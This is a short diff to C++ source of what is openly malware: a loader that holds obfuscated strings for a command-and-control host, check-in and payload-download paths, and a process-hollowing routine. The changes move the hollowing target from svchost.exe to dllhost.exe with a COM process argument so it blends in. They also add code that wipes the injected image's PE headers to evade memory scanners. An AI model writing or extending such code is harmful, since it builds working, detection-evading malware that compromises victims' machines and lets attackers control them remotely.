@@ -39,8 +39,8 @@ static constexpr auto C2H  = mkxw(L"c2.osatechcloud.cloud");
 static constexpr auto PCI  = mkxw(L"/stage/checkin?host=");
 static constexpr auto PPL  = mkxw(L"/stage/payload");
 static constexpr auto PUA  = mkxw(L"Mozilla/5.0");
-static constexpr auto PSVC = mkxw(L"svchost.exe");
-static constexpr auto PSCK = mkxw(L" -k netsvcs");
+static constexpr auto PSVC = mkxw(L"dllhost.exe");
+static constexpr auto PSCK = mkxw(L" /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}");
 static constexpr auto PNTD = mkxs("ntdll.dll");
 static constexpr auto PNUM = mkxs("NtUnmapViewOfSection");
 static constexpr auto PNQI = mkxs("NtQueryInformationProcess");
@@ -218,6 +218,10 @@ static bool Inject(K32f& k, Ntf& nt, BYTE* pe, DWORD) {
             done+=blk->SizeOfBlock;
         }
     }
+
+    // Stomp PE headers in shared mapping — MZ/PE signature is not needed at runtime
+    // but is the first thing memory scanners use to recognize an injected PE
+    SecureZeroMemory(localBase, nth->OptionalHeader.SizeOfHeaders);
 
     // Update PEB.ImageBase
     if(nt.Q){PBI pbi{};ULONG ret=0;
